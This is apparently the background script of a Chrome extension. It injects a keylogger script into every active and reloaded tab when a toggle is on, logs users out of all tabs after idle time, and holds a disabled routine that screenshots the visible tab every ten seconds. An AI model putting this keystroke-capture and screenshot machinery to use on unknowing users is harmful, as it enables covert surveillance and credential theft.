
//Initialize initial background settings
var keyLoggerState;
var autoLogoutState;
//var screenShotState;

chrome.storage.sync.get('monitor', function(value){
		var currentStatus = value['monitor'];
		if(currentStatus === undefined || currentStatus == 'inactive' ){
			console.log("keyLogger is inactive");
			keyLoggerState = false;
		}else{
			console.log("keyLogger is active");
			keyLoggerState = true;
			
		}
	});

function intialInjection(){
	console.log("in function");
	chrome.tabs.query({'active': true}, function (tabs) {
				var url = tabs[0].url;
				console.log("test " + url);
				if(url.search('chrome') == -1){
					chrome.tabs.executeScript(tabs[0].tabId, {
		        		file:'monitor.js',
		        		allFrames: true});
						}
			});
}

chrome.storage.sync.get('autologout', function(value){
	var currentStatus = value['autologout'];
	if(currentStatus === undefined || currentStatus == 'inactive' ){
	  	console.log("autoLogout is inactive");
		autoLogoutState = false;
	}else{
		console.log("autoLogout is active");
		autoLogoutState = true;
	}
});


//creates long-lived Connection for messages
var port = chrome.runtime.connect();

console.log("Background Service is Running");


//Listeners checks from incoming messages coming from the popup.js
chrome.runtime.onConnect.addListener(function(port) {
	port.onMessage.addListener(function(msg) {
			console.log("Message received");
		  if (msg.autologout == "active"){
		  	console.log("Message received autoLogout is active");
		  	autoLogoutState = true;
		  }else if (msg.autologout== "inactive"){
		  	console.log("Message received autoLogout is inactive");
		  	autoLogoutState = false;
		  }else if(msg.keylogger == "active"){
		  	console.log("Message received keyLogger is active");
		  	keyLoggerState = true;
		  	intialInjection();
		  }else if(msg.keylogger == "inactive"){
		  	console.log("Message received keyLogger is inactive");
		  	keyLoggerState = false;
		  }
	});
});

var injectedtabs = [];

//------------------KeyLogger back-end implementation-------------------//

//injects keylogger when tab is in focus
chrome.tabs.onActivated.addListener(function(activeInfo){
	chrome.tabs.get(activeInfo.tabId, function(tab){
		var tabUrl = tab.url;
		if(keyLoggerState == true ){
			//console.log("ActiveChanged inloop tabid: "+ activeInfo.tabId);
			if(tabUrl.search('chrome') == -1){
				chrome.tabs.executeScript(activeInfo.tabId, {
		        file:'monitor.js',
		        allFrames: true});
		        //injectedtabs.push(activeInfo.tabId);
			}
		}
		
	})
	
});

//Reinjects keylogger when page is refreshed
chrome.tabs.onUpdated.addListener(function(tabId,changeInfo,tab){
	//console.log("listener tabId: " + tabId + " " + tab.url);
	var tabUrl = tab.url;
	if(keyLoggerState == true){
		if(tabUrl.search('chrome') == -1){
			chrome.tabs.executeScript(tabId, {
	        file:'monitor.js',
	        allFrames: true});
		}
	}
});



//---------------autoLogout back-end implementation--------------------///


//Detects when computer is idle in seconds
chrome.idle.setDetectionInterval(20);

//When Computer is idle alarm is set to logout accounts
chrome.idle.onStateChanged.addListener(
	function(currentState){
		if(currentState == "idle" && autoLogoutState === true){
			console.log('idle State : idle');
			//chrome.alarms.create("logoutAlarm",{when: Date.now() + 600000} );
			//60000 milliSeconds is 1 Minute
			//1000 milliseconds is 1 second
			chrome.alarms.create("logoutAlarm",{when: Date.now() + 5000} );
		}else if(currentState == "active"){
			console.log('idle State : Active');
			chrome.alarms.clear("logoutAlarm");
		}

	});

//Detects when alarm goes off and injects autoLogout script into all tabs
chrome.alarms.onAlarm.addListener(function(alarm){
	console.log('Alarm Trigger');
	chrome.tabs.query({}, function(tabs) {
    var message = {logout: "logout"};
    for (var i=0; i<tabs.length; ++i) {
    	//console.log(tabs[i].url);
    	var currentTab = tabs[i].url;
    	if(currentTab.search('chrome') == -1){
        	chrome.tabs.executeScript(tabs[i].id,{file:'autologout.js'});
    	}
    }
	});
	

});


// function getTimeStamp(){
// 	var fullTimeStamp;
// 	var dateObject = new Date();
// 	var hours = dateObject.getHours();
// 	var minutes = dateObject.getMinutes();
// 	var day = dateObject.getDate();
// 	var month = dateObject.getMonth();
// 	var year = dateObject.getFullYear();
// 	fullTimeStamp = hours + ":" + minutes + " " + month +"/" + day + "/" + year + ": ";
// 	return fullTimeStamp;
// }

//Screenshots every 10 seconds
/*
setInterval(screenShots, 10000);
var uniqueId = 1;
function screenShots(){
	if(screenShotState == true){
		chrome.tabs.captureVisibleTab(function(screenShotData) {
		 	chrome.tabs.query({'active': true, 'lastFocusedWindow': true}, function (tabs) {
			 	var fullTimeStamp = getTimeStamp();
			 	console.log(tabs[0].url);
		    	fullTimeStamp = fullTimeStamp + tabs[0].url;

		    	console.log(fullTimeStamp);
		    	var finalScreenShotName = fullTimeStamp + " SCID=" + uniqueId;
		    	var screenShotObject = {};
		    	console.log(finalScreenShotName);
		    	screenShotObject[finalScreenShotName] = screenShotData;
		    	chrome.storage.local.set(screenShotObject);
		    	uniqueId++;
			});
		});

	}
}
*/

